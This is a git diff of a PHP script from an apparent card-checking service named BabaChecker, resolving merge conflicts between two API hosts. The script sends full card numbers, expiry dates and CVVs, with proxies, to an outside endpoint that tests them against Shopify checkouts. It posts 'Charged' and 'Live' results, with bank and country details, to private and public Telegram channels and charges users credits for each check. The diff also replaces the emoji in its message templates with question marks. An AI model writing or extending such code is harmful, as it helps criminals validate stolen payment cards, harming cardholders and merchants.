@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 declare(strict_types=1);
 require_once __DIR__ . '/../../app/Bootstrap.php';
 require_once __DIR__ . '/../../app/Db.php';
@@ -244,11 +244,8 @@ $level = $binInfo['level'];
 $issuer = $binInfo['issuer'];
 $country_info = $binInfo['country_info'];
 curl_close($chBin);
-<<<<<<< HEAD
-$requestUrl = "https://ethnix.net/api/autog.php?cc={$cc}|{$month}|{$year}|{$cvv}&email={$email}&site={$site}&proxy={$proxy}";
-=======
 $requestUrl = "https://babachecker.com/api/autog.php?cc={$cc}|{$month}|{$year}|{$cvv}&email={$email}&site={$site}&proxy={$proxy}";
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+
 $req = curl_init();
 curl_setopt_array($req, [
     CURLOPT_URL => $requestUrl,
@@ -334,18 +331,18 @@ if (
     $new_credits = updateCredits($pdo, $uid, 5, false, true);
     $fullResult =
         "<b>#AutoShopifyGraphQL</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Charged 🔥\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> {$gateway}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
-        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Charged ??\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> {$gateway}\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$brand} - {$card_type} - {$level}\n" .
+        "[?] <b>Bank ?</b> {$issuer}\n" .
+        "[?] <b>Country ?</b> {$country_info}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -353,18 +350,15 @@ if (
     $sendResult = sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     error_log("Private group message send result for -1002890276135: " . ($sendResult ? 'Success' : 'Failed'));
     $publicMessage =
-        "<b>Hit Detected ✅</b>\n" .
-        "━━━━━━━━\n" .
-        "<b>User ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "<b>Status ➜</b> <b>Charged 🔥</b>\n" .
-        "<b>Response ➜</b> {$err}\n" .
-        "<b>Gateway ➜</b> Auto Shopify GraphQL\n" .
-        "━━━━━━━━\n" .
-<<<<<<< HEAD
-        "<b>Hit From:</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
-=======
+        "<b>Hit Detected ?</b>\n" .
+        "????????\n" .
+        "<b>User ?</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
+        "<b>Status ?</b> <b>Charged ??</b>\n" .
+        "<b>Response ?</b> {$err}\n" .
+        "<b>Gateway ?</b> Auto Shopify GraphQL\n" .
+        "????????\n" .
         "<b>Hit From:</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     $result = json_encode([
         'status' => 'charge',
@@ -404,18 +398,18 @@ if (
     $new_credits = updateCredits($pdo, $uid, 1, true, false);
     $fullResult =
         "<b>#AutoShopifyGraphQL</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> {$gateway}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
-        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Live ?\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> {$gateway}\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$brand} - {$card_type} - {$level}\n" .
+        "[?] <b>Bank ?</b> {$issuer}\n" .
+        "[?] <b>Country ?</b> {$country_info}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -460,18 +454,18 @@ if (
     $new_credits = updateCredits($pdo, $uid, 3, true, false);
     $fullResult =
         "<b>#AutoShopifyGraphQL</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> {$gateway}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
-        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Live ?\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> {$gateway}\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$brand} - {$card_type} - {$level}\n" .
+        "[?] <b>Bank ?</b> {$issuer}\n" .
+        "[?] <b>Country ?</b> {$country_info}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -515,18 +509,18 @@ if (
     $new_credits = updateCredits($pdo, $uid, 3, true, false);
     $fullResult =
         "<b>#AutoShopifyGraphQL</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> {$gateway}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
-        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Live ?\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> {$gateway}\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$brand} - {$card_type} - {$level}\n" .
+        "[?] <b>Bank ?</b> {$issuer}\n" .
+        "[?] <b>Country ?</b> {$country_info}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -570,18 +564,18 @@ if (
     $new_credits = updateCredits($pdo, $uid, 3, true, false);
     $fullResult =
         "<b>#AutoShopifyGraphQL</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> {$gateway}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
-        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Live ?\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> {$gateway}\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$brand} - {$card_type} - {$level}\n" .
+        "[?] <b>Bank ?</b> {$issuer}\n" .
+        "[?] <b>Country ?</b> {$country_info}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -637,8 +631,5 @@ if (
     echo $result;
     exit;
 }
-<<<<<<< HEAD
 ?>
-=======
-?>
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+
